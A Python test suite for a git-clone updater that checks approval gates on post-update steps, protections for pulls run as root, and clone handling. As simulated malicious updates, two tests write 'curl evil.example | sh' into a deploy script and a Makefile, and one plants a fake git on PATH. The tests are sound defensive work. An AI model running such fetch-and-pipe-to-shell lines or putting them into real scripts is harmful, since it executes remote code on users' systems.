import os
import subprocess
import tempfile
import unittest
from pathlib import Path

from couriercollie import updater

ENV = {**os.environ, "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t", "GIT_COMMITTER_NAME": "t",
       "GIT_COMMITTER_EMAIL": "t@t", "GIT_CONFIG_GLOBAL": "/dev/null"}


def git(folder, *args):
    return subprocess.run(["git", "-C", str(folder), *args], check=True, capture_output=True, text=True,
                          env=ENV).stdout.strip()


class UpstreamCase(unittest.TestCase):
    """A real project repo ("upstream"), your clone of it, and new commits pushed upstream."""

    def setUp(self):
        self.dir = tempfile.TemporaryDirectory()
        root = Path(self.dir.name)
        self.upstream, self.clone, self.other = root / "upstream.git", root / "clone", root / "other"
        subprocess.run(["git", "init", "-q", "--bare", "-b", "main", str(self.upstream)], check=True, env=ENV)
        subprocess.run(["git", "clone", "-q", str(self.upstream), str(self.other)], check=True, env=ENV,
                       capture_output=True)
        (self.other / "a.txt").write_text("one\n")
        git(self.other, "add", ".")
        git(self.other, "commit", "-q", "-m", "first")
        git(self.other, "push", "-q", "origin", "HEAD:main")
        subprocess.run(["git", "clone", "-q", str(self.upstream), str(self.clone)], check=True, env=ENV,
                       capture_output=True)
        self.start = git(self.clone, "rev-parse", "HEAD")

    def tearDown(self):
        os.chmod(self.clone / ".git", 0o755)
        self.dir.cleanup()

    def push_upstream(self, n=1, text="two\n"):
        for i in range(n):
            (self.other / "a.txt").write_text(f"{text}{i}\n")
            git(self.other, "commit", "-q", "-am", f"new {i}")
        git(self.other, "push", "-q", "origin", "HEAD:main")
        return git(self.other, "rev-parse", "HEAD")


class AfterUpdatingTest(UpstreamCase):
    """A clone's step after updates (applying.py): approved once, then run by each Update, inside the app. A real
    clone, a real deploy.sh, and updates pushed to the project."""

    def setUp(self):
        super().setUp()
        from couriercollie import config
        from couriercollie.backend import Backend, Details

        self.config = config
        # The project ships a deploy script; your clone has it.
        (self.other / "deploy.sh").write_text("#!/bin/sh\necho deploying\necho done > deployed.txt\n")
        git(self.other, "add", ".")
        git(self.other, "commit", "-q", "-m", "deploy script")
        git(self.other, "push", "-q", "origin", "HEAD:main")
        git(self.clone, "pull", "-q")
        self.start = git(self.clone, "rev-parse", "HEAD")
        self.path = Path(self.dir.name) / "repos.toml"
        self.id = "github.com/a/project"
        config.save(config.Config(repos=[config.TrackedRepo(
            id=self.id, name="Project", url="", host="github", follow="branch", branch="main", kind="git",
            source="scanned", local_path=str(self.clone), installed=self.start)]), self.path)
        self.backend = Backend(self.path)
        self.backend._run = lambda work, done: done(*UpdateClickedTest._attempt(work))
        self.backend._details[self.id] = Details(state="ready", default_branch="main", install_scripts=["deploy.sh"])

    def tearDown(self):
        self.backend.shutdown()
        super().tearDown()

    def details(self):
        return self.backend.details(self.id)

    def repo(self):
        return self.backend._config.find(self.id)

    def update(self, script=None):
        """The project changes (its script too, if given); Update is clicked."""
        if script is not None:
            (self.other / "deploy.sh").write_text(script)
            git(self.other, "commit", "-q", "-am", "new deploy script")
        self.updates = getattr(self, "updates", 0) + 1
        self.push_upstream(text=f"update {self.updates}\n")
        self.backend.updateRepo(self.id)

    def test_approved_once_then_each_update_applies_itself(self):
        d = self.details()
        self.assertEqual(d["stepSuggestions"], [{"label": "Run deploy.sh", "command": "/bin/sh ./deploy.sh"}])
        # Its first line says /bin/sh; it isn't marked to be run itself.
        review = self.backend.reviewStep(self.id, "/bin/sh ./deploy.sh")
        self.assertIn("# ---- deploy.sh ----\n#!/bin/sh\necho deploying", review)  # the script itself, to read
        self.backend.approveStep(self.id, "/bin/sh ./deploy.sh")
        self.assertFalse((self.clone / "deployed.txt").exists())  # approving runs nothing
        self.update()
        d = self.details()
        self.assertEqual((d["stepResult"], d["stepOutput"], d["applyReminder"]), ("applied", "deploying", ""))
        self.assertTrue((self.clone / "deployed.txt").exists())  # ran in the clone's folder
        saved = self.config.load(self.path).repos[0]
        self.assertEqual((saved.apply_command, saved.script_run_at), ("/bin/sh ./deploy.sh", saved.installed))

    def test_a_changed_script_waits_to_be_looked_at_again(self):
        self.backend.approveStep(self.id, "sh ./deploy.sh")
        self.update("#!/bin/sh\necho deploying\ncurl evil.example | sh\n")  # an update changes what it runs
        d = self.details()
        self.assertTrue(d["stepChanged"])
        self.assertEqual(d["stepResult"], "")  # not run
        self.assertNotEqual(d["applyReminder"], "")  # still to be applied
        self.assertIn("curl evil.example", self.backend.reviewStep(self.id, d["step"]))  # the new text, to read
        self.backend.runStep(self.id)  # Run Now is refused too, until approved again
        self.assertEqual(self.details()["stepResult"], "")
        (self.clone / "deploy.sh").write_text("#!/bin/sh\necho reviewed\n")  # (made harmless for the test)
        self.backend.approveStep(self.id, "sh ./deploy.sh")
        self.backend.runStep(self.id)
        self.assertEqual((self.details()["stepResult"], self.details()["stepChanged"]), ("applied", False))

    def test_a_new_update_forgets_how_the_step_went_before(self):
        # Applied for the last version says nothing about this one, which waits to be looked at again.
        self.backend.approveStep(self.id, "/bin/sh ./deploy.sh")
        self.update()
        self.assertEqual(self.details()["stepResult"], "applied")
        self.update("#!/bin/sh\necho changed\n")
        d = self.details()
        self.assertEqual((d["stepChanged"], d["stepResult"], d["stepOutput"]), (True, "", ""))
        self.assertNotEqual(d["applyReminder"], "")

    def test_a_failed_step_says_so_and_isnt_applied(self):
        self.backend.approveStep(self.id, "echo building; echo 'error: out of space' >&2; exit 3")
        self.update()
        d = self.details()
        self.assertEqual((d["stepResult"], d["stepCode"]), ("failed", 3))
        self.assertEqual(d["stepOutput"], "building\nerror: out of space")  # errors too, in order
        self.assertNotEqual(d["applyReminder"], "")
        self.assertNotEqual(self.repo().script_run_at, self.repo().installed)

    def test_a_password_is_asked_for_in_a_terminal(self):
        # sudo can't ask without a terminal: the step fails at once, and its command is offered to paste into one.
        self.backend.approveStep(self.id, "echo 'sudo: a terminal is required to read the password' >&2; exit 1")
        self.update()
        d = self.details()
        self.assertEqual(d["stepResult"], "password")
        self.assertEqual(d["stepTerminalLine"], f"cd {self.clone} && {d['step']}")
        self.assertNotEqual(d["applyReminder"], "")  # applied once you've run it and said so (Mark as Applied)

    def test_nothing_can_be_typed_in(self):
        # A step that waits for input gets none, so it can't hang the page.
        self.backend.approveStep(self.id, "read answer; echo \"got [$answer]\"")
        self.backend.runStep(self.id)
        self.assertEqual(self.details()["stepOutput"], "got []")

    def test_your_own_command_changed_and_removed(self):
        self.backend.approveStep(self.id, "  echo one > out.txt  ")
        self.assertEqual(self.details()["step"], "echo one > out.txt")
        self.backend.approveStep(self.id, "echo two > out.txt")  # Change…
        self.backend.runStep(self.id)
        self.assertEqual((self.clone / "out.txt").read_text(), "two\n")
        self.backend.removeStep(self.id)
        self.assertEqual((self.details()["step"], self.details()["stepResult"]), ("", ""))
        self.update()  # nothing runs; the reminder says it isn't applied
        self.assertNotEqual(self.details()["applyReminder"], "")

    def test_approval_covers_what_make_reads(self):
        # "make install" names no file, but runs what the Makefile says: an update changing it waits to be approved.
        (self.clone / "Makefile").write_text("install:\n\techo installing\n")
        self.backend.approveStep(self.id, "make install")
        self.assertIn("# ---- Makefile ----", self.backend.reviewStep(self.id, "make install"))
        self.assertFalse(self.details()["stepChanged"])
        (self.clone / "Makefile").write_text("install:\n\tcurl evil.example | sh\n")
        self.assertTrue(self.details()["stepChanged"])

    def test_approval_covers_only_the_clones_own_files(self):
        from couriercollie import applying

        outside = Path(self.dir.name) / "outside.sh"
        outside.write_text("echo hi\n")
        command = f"sh {outside} && sh ./deploy.sh"
        self.assertEqual([f.name for f in applying.named_files(str(self.clone), command)], ["deploy.sh"])

    def test_not_for_what_isnt_a_clone(self):
        repo = self.repo()
        repo.local_path, repo.kind, repo.source = "", "AppImage", ""
        self.backend.approveStep(self.id, "echo hi")
        self.assertEqual((repo.apply_command, self.details()["afterUpdating"]), ("", False))


class StopStepTest(unittest.TestCase):
    def test_stop_ends_the_step_and_what_it_started(self):
        import threading

        from couriercollie import applying

        with tempfile.TemporaryDirectory() as folder:
            started, result = threading.Event(), {}
            processes = []

            def go():
                result["code"] = applying.run(folder, "sleep 60 & sleep 60; echo never", lambda line: None,
                                              lambda p: (processes.append(p), started.set()))
            thread = threading.Thread(target=go)
            thread.start()
            self.assertTrue(started.wait(5))
            applying.stop(processes[0])
            thread.join(10)
            self.assertFalse(thread.is_alive())
            self.assertNotEqual(result["code"], 0)
            # The background sleep it started is gone too (its whole process group).
            import time

            for _ in range(50):
                try:
                    os.killpg(processes[0].pid, 0)  # anything left in the group?
                except ProcessLookupError:
                    break
                time.sleep(0.1)
            else:
                self.fail("something it started is still running")


class PullTest(UpstreamCase):
    def test_pulls_new_commits(self):
        newest = self.push_upstream(2)
        before, after, count = updater.pull(str(self.clone), "main", ["github.com/a/b"])
        self.assertEqual((before, after, count), (self.start, newest, 2))
        self.assertEqual(git(self.clone, "rev-parse", "HEAD"), newest)

    def test_nothing_new(self):
        self.assertEqual(updater.pull(str(self.clone), "main", []), (self.start, self.start, 0))

    def test_your_own_commits_are_never_combined(self):
        self.push_upstream()
        (self.clone / "b.txt").write_text("mine\n")
        git(self.clone, "add", ".")
        git(self.clone, "commit", "-q", "-m", "mine")
        mine = git(self.clone, "rev-parse", "HEAD")
        with self.assertRaisesRegex(updater.UpdateError, "commits of its own"):
            updater.pull(str(self.clone), "main", [])
        self.assertEqual(git(self.clone, "rev-parse", "HEAD"), mine)  # untouched

    def test_your_changed_files_are_never_overwritten(self):
        self.push_upstream()
        (self.clone / "a.txt").write_text("edited by you\n")
        with self.assertRaisesRegex(updater.UpdateError, "Commit or stash"):
            updater.pull(str(self.clone), "main", [])
        self.assertEqual((self.clone / "a.txt").read_text(), "edited by you\n")
        self.assertEqual(git(self.clone, "rev-parse", "HEAD"), self.start)

    def test_a_clone_on_another_branch_is_left_alone(self):
        self.push_upstream()
        git(self.clone, "switch", "-q", "-c", "mine")
        with self.assertRaisesRegex(updater.UpdateError, "on mine, not main"):
            updater.pull(str(self.clone), "main", [])
        self.assertEqual(git(self.clone, "rev-parse", "HEAD"), self.start)

    @unittest.skipIf(os.geteuid() == 0, "root can write anywhere")
    def test_a_read_only_clone_of_yours_is_left_alone(self):
        os.chmod(self.clone / ".git", 0o555)
        with self.assertRaisesRegex(updater.UpdateError, "permissions"):
            updater.pull(str(self.clone), "main", [])

    def test_someone_elses_clone_is_left_alone(self):
        self.as_owner(1234)
        with self.assertRaisesRegex(updater.UpdateError, "As that user.*git pull --ff-only"):
            updater.pull(str(self.clone), "main", [])

    def test_the_systems_clone_asks_for_the_password_once(self):
        newest = self.push_upstream()
        asked = self.as_owner(0)
        self.assertEqual(updater.pull(str(self.clone), "main", [])[1:], (newest, 1))
        self.assertEqual(len(asked), 1)  # fetch and fast-forward in one go
        self.assertIn("merge --ff-only", asked[0])

    def test_as_root_the_clones_hooks_and_your_programs_dont_run(self):
        self.push_upstream()
        self.as_owner(0)
        ran = Path(self.dir.name) / "ran"
        hook = self.clone / ".git" / "hooks" / "post-merge"
        hook.write_text(f"#!/bin/sh\necho hook >> {ran}\n")
        hook.chmod(0o755)
        # A "git" in a folder you can write to, first in your PATH. As you, it may run (it passes everything on to
        # the real git); the steps run as root (fetch, merge) must never go through it.
        fake, used = Path(self.dir.name) / "bin", Path(self.dir.name) / "fake-git-used"
        fake.mkdir()
        (fake / "git").write_text(f'#!/bin/sh\necho "$@" >> {used}\nexec /usr/bin/git "$@"\n')
        (fake / "git").chmod(0o755)
        saved = os.environ["PATH"]
        os.environ["PATH"] = f"{fake}:{saved}"
        self.addCleanup(os.environ.__setitem__, "PATH", saved)
        updater.pull(str(self.clone), "main", [])
        self.assertFalse(ran.exists(), ran.read_text() if ran.exists() else "")
        as_you = used.read_text() if used.exists() else ""
        self.assertNotIn("fetch", as_you)
        self.assertNotIn("merge", as_you)
        os.environ["PATH"] = saved
        updater._writable = lambda path: True  # as you, your own hooks run as usual
        self.push_upstream(text="three\n")
        updater.pull(str(self.clone), "main", [])
        self.assertEqual(ran.read_text(), "hook\n")

    def test_no_password_no_change(self):
        self.push_upstream()
        self.as_owner(0, root=["sh", "-c", "exit 126", "polkit"])  # the password dialog was cancelled
        with self.assertRaisesRegex(updater.UpdateError, "password wasn\u2019t given"):
            updater.pull(str(self.clone), "main", [])
        self.assertEqual(git(self.clone, "rev-parse", "HEAD"), self.start)

    def as_owner(self, uid, root=None):
        """Pretend the clone belongs to `uid` and can't be written as you. Returns the requests that would ask for the
        password, one per update."""
        asked = []
        saved = updater._writable, updater._owner, updater.ROOT
        updater._writable, updater._owner = (lambda path: False), (lambda path: uid)
        updater.ROOT = root or ["env"]  # runs the commands as you, where pkexec would ask for the password
        self.addCleanup(lambda: (setattr(updater, "_writable", saved[0]), setattr(updater, "_owner", saved[1]),
                                 setattr(updater, "ROOT", saved[2])))
        real_run = updater._run_steps

        def run(path, steps, as_root):
            if as_root:
                asked.append(" ".join(" ".join(step) for step in steps))
            return real_run(path, steps, as_root)

        updater._run_steps = run
        self.addCleanup(setattr, updater, "_run_steps", real_run)
        return asked

    def test_follows_releases(self):
        # The project's releases are tags; your clone is on main, at v1.
        git(self.other, "tag", "v1")
        newest = self.push_upstream()
        git(self.other, "tag", "v2")
        git(self.other, "push", "-q", "origin", "v1", "v2")
        git(self.clone, "fetch", "-q", "--tags")
        from couriercollie import scan

        self.assertEqual(scan.version_on_disk(str(self.clone), releases=True), ("v1", True))
        self.assertEqual(updater.checkout_release(str(self.clone), "v2", []), (self.start, "main"))
        self.assertEqual(git(self.clone, "rev-parse", "HEAD"), newest)
        self.assertEqual(scan.version_on_disk(str(self.clone), releases=True), ("v2", True))
        self.assertEqual(git(self.clone, "rev-parse", "main"), self.start)  # your branch is as it was

    def test_moving_to_a_release_never_strands_your_commits(self):
        git(self.other, "tag", "v2")
        git(self.other, "push", "-q", "origin", "v2")
        git(self.clone, "switch", "-q", "--detach")
        (self.clone / "b.txt").write_text("mine\n")
        git(self.clone, "add", ".")
        git(self.clone, "commit", "-q", "-m", "mine, on no branch")
        mine = git(self.clone, "rev-parse", "HEAD")
        with self.assertRaisesRegex(updater.UpdateError, "aren\u2019t on any branch"):
            updater.checkout_release(str(self.clone), "v2", [])
        self.assertEqual(git(self.clone, "rev-parse", "HEAD"), mine)

    def test_the_remote_matching_the_project_is_used(self):
        # The clone's "origin" is someone's fork; the tracked project is another remote.
        newest = self.push_upstream()
        git(self.clone, "remote", "rename", "origin", "project")
        git(self.clone, "remote", "add", "origin", "https://github.com/someone/fork.git")
        git(self.clone, "remote", "set-url", "project", str(self.upstream))
        self.assertEqual(updater._remote_for(str(self.clone), ["github.com/x/y"]), "origin")
        git(self.clone, "remote", "add", "named", "https://github.com/X/Y.git")
        self.assertEqual(updater._remote_for(str(self.clone), ["github.com/x/y"]), "named")
        git(self.clone, "remote", "remove", "named")
        # (Pulling through "project" by hand-picked name, as a scan would have matched it by its address.)
        git(self.clone, "remote", "rename", "origin", "fork")
        git(self.clone, "remote", "rename", "project", "origin")
        self.assertEqual(updater.pull(str(self.clone), "main", ["github.com/x/y"])[1], newest)


class WhyItFailedTest(unittest.TestCase):
    """The one line said when a package manager or git fails: the one that says why."""

    def why(self, stdout="", stderr="", program="zypper"):
        return updater._last_line(subprocess.CompletedProcess([], 8, stdout, stderr), program)

    def test_zypper(self):
        # Its last lines say nothing ("Please see the above error message for a hint.").
        out = ("warning: gh.rpm: Header V4 RSA/SHA512 Signature, key ID 62313325: NOKEY\n"
               "gh-2.102.0-1.x86_64 (Plain RPM files cache): Signature verification failed [4-Signatures public key "
               "is not available]\nAbort, retry, ignore? [a/r/i] (a): a\nProblem occurred during or after "
               "installation or removal of packages:\nInstallation has been aborted as directed.\n"
               "Please see the above error message for a hint.\n")
        self.assertEqual(self.why(out), "gh-2.102.0-1.x86_64 (Plain RPM files cache): Signature verification failed "
                                        "[4-Signatures public key is not available]")

    def test_apt_and_git(self):
        self.assertEqual(self.why("Reading package lists...\n", "E: Unable to locate package x\nN: see apt(8)\n", "apt"),
                         "E: Unable to locate package x")
        self.assertEqual(self.why("", "fatal: repository 'https://x/y.git/' not found\n", "git"),
                         "fatal: repository 'https://x/y.git/' not found")
        self.assertEqual(self.why("all went oddly\n", "", "dnf"), "all went oddly")  # nothing says why: the last line
        self.assertEqual(self.why("", "", "pacman"), "pacman exited with 8")


class InstallScriptTest(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.TemporaryDirectory()
        self.path = self.dir.name

    def tearDown(self):
        self.dir.cleanup()

    def test_found_by_name_and_uninstall_isnt_offered(self):
        Path(self.path, "scripts").mkdir()
        for name in ("install.sh", "uninstall.sh", "setup.sh", "README.md", "scripts/setup.sh", "scripts/other.sh"):
            Path(self.path, name).write_text("#!/bin/bash\necho hi\n")
        self.assertEqual(updater.install_scripts(self.path), ["install.sh", "setup.sh", "scripts/setup.sh"])

    def test_huge_files_arent_offered(self):
        Path(self.path, "install.sh").write_text("x" * (updater.SCRIPT_MAX_BYTES + 1))
        self.assertEqual(updater.install_scripts(self.path), [])

    def test_runs_as_its_first_line_says_from_the_clones_folder(self):
        script = Path(self.path, "install.sh")
        script.write_text("#!/usr/bin/env bash\necho hi\n")
        self.assertEqual(updater._interpreter(script), ["/usr/bin/env", "bash", "./install.sh"])
        Path(self.path, "scripts").mkdir()
        Path(self.path, "scripts/setup.sh").write_text("echo hi\n")
        self.assertEqual(updater._interpreter(Path(self.path, "scripts/setup.sh"), "scripts/setup.sh"),
                         ["sh", "./scripts/setup.sh"])  # run from the clone's folder
        script.chmod(0o755)
        self.assertEqual(updater._interpreter(script), ["./install.sh"])
        script.chmod(0o644)
        script.write_text("echo no first line\n")
        self.assertEqual(updater._interpreter(script), ["sh", "./install.sh"])


class UpdateClickedTest(UpstreamCase):
    """Update clicked in the window, for a scanned clone that's behind."""

    def setUp(self):
        super().setUp()
        from couriercollie import checker, config, sources
        from couriercollie.backend import Backend, Details

        self.checker, self.config = checker, config
        self.path = Path(self.dir.name) / "repos.toml"
        self.id = "github.com/a/project"
        config.save(config.Config(repos=[config.TrackedRepo(
            id=self.id, name="Project", url="", host="github", follow="branch", branch="main", kind="git",
            source="scanned", local_path=str(self.clone), installed=self.start)]), self.path)
        self.backend = Backend(self.path)
        self.backend._run = lambda work, done: done(*self._attempt(work))
        self.newest = self.push_upstream()
        self.backend._details[self.id] = Details(state="ready", default_branch="main",
                                                 branches=[sources.Branch("main", self.newest)],
                                                 comparison=sources.Comparison(sources.BEHIND, 1, []),
                                                 commits_base=self.start, commits_head=self.newest)
        self.backend._checks.results[self.id] = checker.Result(checker.UPDATE, "Update available", self.newest)
        # Nothing here may ask the site.
        self.saved = sources.http_get_json
        sources.http_get_json = lambda *a, **k: self.fail("asked the site")

    def tearDown(self):
        from couriercollie import sources

        sources.http_get_json = self.saved
        self.backend.shutdown()
        super().tearDown()

    @staticmethod
    def _attempt(work):
        try:
            return work(), None
        except Exception as e:  # noqa: BLE001
            return None, e

    def test_update_pulls_and_everything_follows(self):
        self.assertTrue(self.backend.details(self.id)["canUpdate"])
        self.backend.updateRepo(self.id)
        d = self.backend.details(self.id)
        self.assertEqual(self.config.load(self.path).repos[0].installed, self.newest)
        self.assertEqual((d["statusKind"], d["updateNote"]), ("current", "Pulled 1 new commit."))
        self.assertEqual(self.backend._checks.results[self.id].status, self.checker.UP_TO_DATE)
        self.assertFalse(self.backend.repo(self.id)["updateAvailable"])

    def test_nothing_known_to_run_no_after_updating(self):
        # No script, containers or build folder, and no step chosen: nothing to offer, so no section (nor a box).
        self.assertFalse(self.backend.details(self.id)["afterUpdating"])
        self.backend.updateRepo(self.id)
        self.assertFalse(self.backend.details(self.id)["afterUpdating"])

    def test_mark_as_applied(self):
        # A step that didn't run (changed since it was approved): after an update, a reminder that a running program
        # doesn't use it yet.
        repo = self.backend._config.find(self.id)
        repo.apply_command, repo.apply_approved = "true", "approved before it changed"
        self.assertEqual(self.backend.details(self.id)["applyReminder"], "")
        self.backend.updateRepo(self.id)
        self.assertTrue(self.backend.details(self.id)["applyReminder"].startswith(
            f"Updated to commit {self.newest[:7]}, but not in use yet"))
        self.assertEqual(self.config.load(self.path).repos[0].updated_to, self.newest)  # kept
        self.backend.markApplied(self.id)  # done by hand, or by the project's own updater
        self.assertEqual(self.backend.details(self.id)["applyReminder"], "")

    def test_refresh_or_a_check_clears_the_note(self):
        from couriercollie import sources

        self.backend.updateRepo(self.id)
        self.assertEqual(self.backend.details(self.id)["updateNote"], "Pulled 1 new commit.")
        saved = sources.releases, sources.branches
        sources.releases, sources.branches = (lambda ref, host, **_: []), (lambda ref: ("main", []))
        self.addCleanup(lambda: (setattr(sources, "releases", saved[0]), setattr(sources, "branches", saved[1])))
        self.backend.loadDetails(self.id, True)  # Refresh on the repo page
        self.assertEqual(self.backend.details(self.id)["updateNote"], "")
        self.backend._update_notes[self.id] = ("done", "Pulled 1 new commit.")
        saved_check = self.checker.check_all
        self.checker.check_all = lambda repos, previous: (self.checker.State(), [])
        self.addCleanup(setattr, self.checker, "check_all", saved_check)
        self.backend.checkNow()  # Check Now, in the list
        self.assertEqual(self.backend.details(self.id)["updateNote"], "")

    def test_a_refused_update_says_why_and_changes_nothing(self):
        (self.clone / "a.txt").write_text("edited by you\n")
        self.backend.updateRepo(self.id)
        d = self.backend.details(self.id)
        self.assertEqual(d["updateNoteKind"], "error")
        self.assertIn("Commit or stash", d["updateNote"])
        self.assertEqual(self.config.load(self.path).repos[0].installed, self.start)
        self.assertTrue(self.backend.repo(self.id)["updateAvailable"])

    def test_a_clone_following_releases_moves_to_the_newest(self):
        from couriercollie import sources

        git(self.other, "tag", "v2")
        git(self.other, "push", "-q", "origin", "v2")
        repo = self.backend._config.find(self.id)
        repo.follow, repo.installed = "releases", self.start
        d = self.backend._details[self.id]
        d.releases = [sources.Release("v2", "v2", None, False, "", "", [])]
        self.backend.updateRepo(self.id)
        d = self.backend.details(self.id)
        self.assertEqual(git(self.clone, "rev-parse", "HEAD"), self.newest)
        self.assertEqual(self.config.load(self.path).repos[0].installed, "v2")
        self.assertEqual(d["statusKind"], "current")
        self.assertEqual(d["updateNote"], "Now at v2. Your branch main is unchanged; git switch main goes back to it.")

    def test_only_clones_found_by_a_scan(self):
        repo = self.backend._config.find(self.id)
        repo.source = "manual"
        self.assertFalse(self.backend.repo(self.id)["canUpdate"])
        self.backend.updateRepo(self.id)
        self.assertEqual(git(self.clone, "rev-parse", "HEAD"), self.start)


class CloneTest(UpstreamCase):
    """Install for a project you don't have, added by hand and followed by branch or version: it's cloned."""

    def setUp(self):
        super().setUp()
        root = Path(self.dir.name)
        os.environ["COURIERCOLLIE_CLONES"] = str(root / "src")
        self.addCleanup(os.environ.pop, "COURIERCOLLIE_CLONES", None)
        # The project's address leads to the local upstream, as if it were on GitHub.
        for key, value in (("GIT_CONFIG_COUNT", "1"), ("GIT_CONFIG_KEY_0", f"url.{self.upstream}.insteadOf"),
                           ("GIT_CONFIG_VALUE_0", "https://github.com/a/project.git")):
            self.addCleanup(lambda k=key, v=os.environ.get(key): os.environ.pop(k) if v is None
                            else os.environ.__setitem__(k, v))
            os.environ[key] = value

    def backend(self, follow="branch", kind=""):
        from couriercollie import config, sources
        from couriercollie.backend import Backend, Details

        path = Path(self.dir.name) / "repos.toml"
        self.id = "github.com/a/project"
        config.save(config.Config(repos=[config.TrackedRepo(
            id=self.id, name="Project", url="", host="github", follow=follow, kind=kind, installed="-")]), path)
        backend = Backend(path)
        self.addCleanup(backend.shutdown)
        backend._run = lambda work, done: done(*UpdateClickedTest._attempt(work))
        head = git(self.other, "rev-parse", "HEAD")
        backend._details[self.id] = Details(state="ready", default_branch="main",
                                            branches=[sources.Branch("main", head)],
                                            releases=[sources.Release("v1", "v1", None, False, "", "", [])])
        return backend, path

    def test_clones_into_a_free_folder_and_a_failed_one_leaves_nothing(self):
        url = "https://github.com/a/project.git"
        first = updater.clone(url, "main", "project")
        self.assertEqual(first, Path(os.environ["COURIERCOLLIE_CLONES"]) / "project")
        self.assertEqual(git(first, "symbolic-ref", "--short", "HEAD"), "main")
        self.assertEqual(updater.clone(url, "main", "project").name, "project-2")
        with self.assertRaisesRegex(updater.UpdateError, "Couldn’t clone the project"):
            updater.clone(url, "no-such-branch", "project")
        self.assertEqual(sorted(p.name for p in first.parent.iterdir()), ["project", "project-2"])

    def test_install_clones_the_branch_and_it_becomes_a_clone(self):
        (self.other / "install.sh").write_text("echo hi\n")
        git(self.other, "add", ".")
        git(self.other, "commit", "-q", "-m", "installer")
        git(self.other, "push", "-q", "origin", "HEAD:main")
        backend, path = self.backend()
        d = backend.details(self.id)
        self.assertTrue(d["canUpdate"] and d["installClones"])
        self.assertEqual(d["statusKind"], "notInstalled")
        backend.updateRepo(self.id)
        d = backend.details(self.id)
        folder = Path(os.environ["COURIERCOLLIE_CLONES"]) / "project"
        self.assertEqual(d["updateNote"], f"Cloned main into {folder}. To install it, choose its step under After "
                                          "Updating, then Run Now.")
        self.assertEqual(d["statusKind"], "current")
        self.assertEqual([s["label"] for s in d["stepSuggestions"]], ["Run install.sh"])
        self.assertFalse(d["installClones"])
        self.assertTrue(d["isClone"])
        from couriercollie import config

        saved = config.load(path).repos[0]
        self.assertEqual((saved.source, saved.local_path, saved.kind, saved.installed),
                         ("scanned", str(folder), "git", git(folder, "rev-parse", "HEAD")))

    def test_install_clones_the_newest_release(self):
        git(self.other, "tag", "v1")
        git(self.other, "push", "-q", "origin", "v1")
        self.push_upstream()  # newer than the release
        backend, path = self.backend(follow="releases", kind="versions")
        backend.updateRepo(self.id)
        d = backend.details(self.id)
        self.assertEqual(d["updateNoteKind"], "done", d["updateNote"])
        self.assertEqual(d["statusKind"], "current")
        folder = Path(os.environ["COURIERCOLLIE_CLONES"]) / "project"
        self.assertEqual(git(folder, "rev-parse", "HEAD"), self.start)
        from couriercollie import scan

        self.assertEqual(scan.version_on_disk(str(folder), releases=True), ("v1", True))

    def test_only_when_you_dont_have_it(self):
        backend, _ = self.backend()
        backend._config.find(self.id).installed = "abc"
        self.assertFalse(backend.details(self.id)["canUpdate"])
        backend, _ = self.backend(follow="releases", kind="appimage")
        self.assertFalse(backend.details(self.id)["installClones"])


if __name__ == "__main__":
    unittest.main()


class CompareHereTest(unittest.TestCase):
    """Comparing your commit with the branch's newest in the clone itself, when it has both."""

    def setUp(self):
        self.dir = tempfile.TemporaryDirectory()
        self.repo = Path(self.dir.name) / "clone"
        self.env = {**os.environ, "GIT_CONFIG_GLOBAL": "/dev/null", "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t",
                    "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t"}
        self.git("init", "-q", "-b", "main", str(self.repo), cwd=self.dir.name)
        self.a = self.commit("first")
        self.b = self.commit("second")
        self.c = self.commit("third")  # the branch's newest

    def tearDown(self):
        self.dir.cleanup()

    def git(self, *args, cwd=None):
        return subprocess.run(["git", *args], cwd=cwd or self.repo, env=self.env, check=True, capture_output=True,
                              text=True).stdout.strip()

    def commit(self, message):
        self.git("commit", "-q", "--allow-empty", "-m", message)
        return self.git("rev-parse", "HEAD")

    def test_behind_with_the_new_commits(self):
        from couriercollie import sources

        c = updater.compare_here(str(self.repo), self.a, self.c)
        self.assertEqual((c.relation, c.total, [x.title for x in c.commits]), (sources.BEHIND, 2, ["third", "second"]))

    def test_a_commit_of_your_own_never_pushed(self):
        from couriercollie import sources

        mine = self.commit("my own change")  # on top of the newest: you have everything, and more
        self.assertEqual(updater.compare_here(str(self.repo), mine, self.c).relation, sources.AHEAD)
        self.git("reset", "-q", "--hard", self.a)
        mine = self.commit("my own change, from before")
        self.assertEqual(updater.compare_here(str(self.repo), mine, self.c).relation, sources.DIVERGED)

    def test_only_when_the_clone_has_both(self):
        self.assertIsNone(updater.compare_here(str(self.repo), self.a, "f" * 40))  # not fetched yet: ask the site
        self.assertIsNone(updater.compare_here(self.dir.name, self.a, self.c))  # not a clone
        self.assertIsNone(updater.compare_here("", self.a, self.c))


class SomeoneElsesTest(unittest.TestCase):
    def test_another_persons_clone_is_theirs(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / ".git").mkdir()
            self.assertEqual(updater.someone_elses(d), "")  # yours
            self.assertEqual(updater.someone_elses(str(Path(d) / "gone")), "")
            saved = updater._owner
            self.addCleanup(setattr, updater, "_owner", saved)
            updater._owner = lambda path: 0
            self.assertEqual(updater.someone_elses(d), "")  # the system's: updated as root, with your password
            updater._owner = lambda path: 65534
            self.assertEqual(updater.someone_elses(d), "nobody")
